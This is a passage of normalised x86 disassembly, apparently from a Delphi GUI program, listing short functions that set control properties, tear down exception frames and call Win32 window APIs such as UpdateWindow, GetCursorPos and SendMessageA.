mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_435d5c
retn
sub_4396f4
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_435d5c
retn
sub_439704
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_435d5c
retn
sub_4399b0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43b6a0
pop esi
retn
sub_439ac4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_439b14
pop esi
retn
sub_439ad8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_439c00
pop esi
retn
sub_439aec
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_439b00
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_439bf3
jmp sub_40387c
sub_439bfa
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439c8a
jmp sub_40387c
sub_439c91
pop ebx
pop ecx
pop ebp
retn
sub_439c98
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_439ca8
retn
sub_439cac
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_439ccc
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_439e2c
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_439efc
retn
sub_43a014
jmp sub_40387c
sub_43a01b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a0e6
jmp sub_40387c
sub_43a110
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43a1a2
jmp sub_40387c
sub_43a374
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43a618
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_43a6f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_438120
pop esi
retn
sub_43a7b8
push esi
mov si 0xffc1
call sub_403324
pop esi
retn
sub_43a7e4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43a7f8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43a80c
call sub_4380e0
retn
sub_43a814
call sub_4380e0
retn
sub_43a81c
call sub_4380e0
retn
sub_43a8c4
push ebx
mov ebx eax
mov eax ebx
call sub_436778
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41cd48
mov dx 0xb009
mov eax ebx
call sub_438120
pop ebx
retn
sub_43aa28
call sub_4380e0
retn
sub_43aa30
call sub_4380e0
retn
sub_43aa38
call sub_4380e0
retn
sub_43aa40
call sub_4380e0
retn
sub_43aaa4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43af3a
jmp sub_40387c
sub_43af41
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b020
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_43b1c4
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_435d5c
retn
sub_43b264
push ebx
mov ebx eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_43b280
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_43b458
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_43b390
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_43b4b0
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435d5c
sub_43b4d0
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_435d5c
sub_43b4f4
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_43b500
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_435d5c
sub_43b5ac
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_43b550
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_43b688
jmp sub_40387c
sub_43b68f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b8ae
jmp sub_40387c
sub_43b8b5
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b978
call sub_435b2c
retn
sub_43bdc6
jmp sub_40387c
sub_43be5c
mov eax [ r-xdata ]
retn
sub_43bfc3
jmp sub_40387c
sub_43c0d4
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435d5c
sub_43c0f4
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435d5c
sub_43c40a
jmp sub_40387c
sub_43c54c
test [ eax + 0x52 ] 0x4
setne al
retn
sub_43c6a8
jmp sub_40387c
sub_43c6af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d374
retn
sub_43c6cb
jmp sub_40387c
sub_43c6d8
retn
sub_43c7ac
mov [ edx + 0xc ] 0xffffffff
retn
sub_43c80a
jmp sub_40387c
sub_43c811
pop ecx
pop ecx
pop ebp
retn
sub_43c8b1
jmp sub_40387c
sub_43c8b8
pop ebx
mov esp ebp
pop ebp
retn
sub_43c924
call sub_4388e8
retn
sub_43c9b7
jmp sub_40387c
sub_43c9be
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_43cb9d
jmp sub_40387c
sub_43cba4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cd00
push ebx
mov ebx eax
mov eax ebx
call sub_441cac
or edx 0xffffffff
mov eax ebx
call sub_43ce2c
pop ebx
retn
sub_43cdd8
jmp sub_40387c
sub_43ce2c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_43cd18
sub_43cf9c
push ebx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_43cfb4
push ebx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_43d0a0
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_439520
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_43d13b
jmp sub_40387c
sub_43d142
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d165
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d374
retn
sub_43d15e
jmp sub_40387c
sub_43d165
pop ebx
pop ecx
pop ebp
retn
sub_43d16c
retn
sub_43d1d4
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_43d541
jmp sub_40387c
sub_43d728
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_43d914
jmp sub_40387c
sub_43d9c4
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_43d9d8
inc [ eax + 0x6c ]
retn
sub_43d9dc
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_43f25c
sub_43db3c
call sub_43e23c
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_43e4e7
jmp sub_40387c
sub_43e4ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e50b
lea eax [ ebp - 0xc ]
call sub_403e78
retn
sub_43e504
jmp sub_40387c
sub_43e50b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e7ec
jmp sub_40387c
sub_43e7f3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e810
mov eax [ ebp - 0x4 ]
call sub_41d374
retn
sub_43e809
jmp sub_40387c
sub_43e810
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e82d
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_43e826
jmp sub_40387c
sub_43e82d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ece1
jmp sub_40387c
sub_43ece8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ee73
jmp sub_40387c
sub_43ee7a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ef2f
jmp sub_40387c
sub_43ef36
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f024
jmp sub_40387c
sub_43f075
jmp sub_40387c
sub_43f07c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f138
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43da48
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_43f284
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_43d584
sub_43fb84
jmp sub_40387c
sub_43fb8b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fc54
call GetCapture
retn
sub_43fc5c
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c7b0
pop ebx
retn
sub_43fc6c
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_43fed2
jmp sub_40387c
sub_4400cc
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4402e0
jmp sub_40387c
sub_4402e7
pop ebx
mov esp ebp
pop ebp
retn
sub_440393
jmp sub_40387c
sub_44039a
pop ebp
retn
sub_440422
jmp sub_40387c
sub_440429
pop ebp
retn
sub_440806
pushad
add [ eax ] al
jmp [ eax ]
sub_440b78
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413914
retn
sub_440b90
mov al 0x1
retn
sub_440b94
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_4196a0
retn
mov eax edx
retn
sub_440ba4
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_419670
retn
mov al 0x1
retn
sub_440e94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4138b8
pop esi
pop ebx
retn
sub_440ea8
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_440ee4
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_441148
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_44115c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_441170
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_441184
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_441198
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4411ac
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4411c0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4411d4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4411e8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4411fc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_441210
retn
sub_441214
retn
sub_441218
retn
sub_44121c
retn
sub_441220
retn
sub_441224
retn
sub_441228
retn
sub_44122c
retn
sub_441230
retn
sub_441234
retn
sub_441238
retn
sub_44123c
retn
sub_4414e8
jmp sub_40387c
sub_441884
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x90 ] eax
sub_4418ac
push esi
mov si 0xffef
call sub_403324
pop esi
retn
sub_44194d
jmp sub_40387c
sub_441954
pop ebp
retn
sub_441958
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
sub_441b80
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_441d59
jmp sub_40387c
sub_441d60
pop ebx
pop ecx
pop ebp
retn
sub_441d64
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_441d6c
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_441fd4
sub_441e19
jmp sub_40387c
sub_441e20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403128
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_441f28
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_442067
jmp sub_40387c
sub_44206e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442106
jmp sub_40387c
sub_44210d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44212a
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_442123
jmp sub_40387c
sub_44212a
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442201
jmp sub_40387c
sub_44223f
jmp sub_40387c
sub_442246
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44240b
jmp sub_40387c
sub_442412
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44242f
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_442428
jmp sub_40387c
sub_44242f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4424a8
retn
sub_442448
jmp sub_40387c
sub_442497
jmp sub_40387c
sub_44249e
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_442527
jmp sub_40387c
sub_44252e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442534
or edx 0xffffffff
call sub_4424a8
retn
sub_442943
jmp sub_40387c
sub_44294a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442967
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_442960
jmp sub_40387c
sub_442967
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442984
mov eax [ ebp - 0x4 ]
call sub_44347c
retn
sub_44297d
jmp sub_40387c
sub_442984
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442b88
jmp sub_40387c
sub_442b8f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442b94
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403324
sub_442bac
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_41245c
pop ebx
retn
sub_442c50
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41375c
sub_442d67
jmp sub_40387c
sub_442d6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_442d84
jmp sub_40387c
sub_443096
jmp sub_40387c
sub_44309d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4430ba
mov eax [ ebp - 0x10 ]
call sub_403128
retn
sub_4430b3
jmp sub_40387c
sub_4430ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4430d7
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_4430d0
jmp sub_40387c
sub_4430d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443140
jmp sub_40387c
sub_443259
jmp sub_40387c
sub_443276
jmp sub_40387c
sub_44342e
jmp sub_40387c
sub_443435
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443478
inc [ eax + 0x5c ]
retn
sub_44347c
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403324
sub_4434d0
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44350d
jmp sub_40387c
sub_443514
pop ebp
retn
sub_443518
sub [ rw-data ] 0x1
retn
sub_444423
jmp [ eax + eax ]
sub_444480
mov eax [ esp + 0x8 ]
retn
sub_444488
push ebx
mov ebx eax
call sub_444480
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
jmp sub_4038b4
sub_4444a4
pop ebx
retn
sub_44471d
jmp sub_40387c
sub_444724
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44486f
jmp sub_40387c
sub_444876
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44488c
push ebx
mov eax [ rw-data ]
call sub_413dd0
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413d8c
mov eax ebx
pop ebx
retn
sub_444a14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_444a30
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44512b
jmp sub_40387c
sub_445132
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44522a
jmp sub_40387c
sub_445231
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445654
jmp sub_40387c
sub_44565b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_445b07
jmp sub_40387c
sub_445fa8
jmp sub_40387c
sub_445faf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446413
jmp sub_40387c
sub_4468d0
jmp sub_40387c
sub_4468d7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446c82
jmp sub_40387c
sub_446c89
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_446c97
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446e44
mov eax [ r-xdata ]
retn
sub_446e80
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446e94
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446ea4
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446eb4
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_4471b0
mov edx eax
sub_446f4c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov edx esi
call sub_446ecc
pop esi
pop ebx
retn
sub_446fc8
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4471b0
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413914
mov ecx eax
sub_4473a0
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_447408
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_4477b0
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_4477e4
sub_4477e4
mov edx sub_4477bc
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44490c
retn
sub_4479ce
jmp sub_40387c
sub_4479d5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447e6c
jmp sub_40387c
sub_447eab
jmp sub_40387c
sub_447eb2
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448050
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44818c
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403324
pop esi
pop ebp
retn 0x8
sub_4481a8
mov eax [ eax + 0x34 ]
call sub_4453e0
retn
sub_4481b4
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403324
pop esi
retn
sub_4481f0
push ebx
mov ecx sub_4481c8
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44490c
pop ebx
retn
sub_448424
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_448438
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_44856d
jmp sub_4035c8
sub_44866f
jmp sub_40387c
sub_44869a
jmp sub_40387c
sub_4486a1
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4486b8
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_4488a0
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4481f0
sub_448920
jmp sub_40387c
sub_448964
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44897c
push ebx
mov ebx eax
mov eax ebx
call sub_4196c0
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_4489ce
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4481f0
sub_448a44
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_448b8d
jmp sub_40387c
sub_448b94
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448dd4
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_448de4
sub_448e38
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_448e48
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_448e58
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_448e68
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_448e78
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_448ef0
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_445238
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_445238
retn
sub_448f0c
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_445238
sub_448f54
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_4481a8
retn
mov eax edx
retn
sub_448f8e
jmp sub_4035c8
sub_448f93
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_455598
call sub_403930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4492f9
jmp sub_40387c
sub_449300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403128
retn
sub_449316
jmp sub_40387c
sub_449417
jmp sub_40387c
sub_44941e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44943b
mov eax [ ebp - 0x14 ]
call sub_403128
retn
sub_449434
jmp sub_40387c
sub_449459
jmp sub_40387c
sub_4494e3
jmp sub_40387c
sub_4494ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44951c
push ebx
mov ebx eax
mov eax ebx
call sub_4139fc
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41a470
sub_4495e0
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_4495f4
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_4495fc
